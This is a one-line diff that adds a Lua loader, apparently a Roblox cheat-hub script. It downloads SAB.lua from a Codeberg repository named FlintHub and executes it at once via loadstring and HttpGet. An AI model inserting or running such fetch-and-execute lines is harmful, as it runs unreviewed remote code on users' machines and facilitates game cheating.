@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://codeberg.org/flinthub/FlintHub/raw/branch/main/SAB.lua"))()
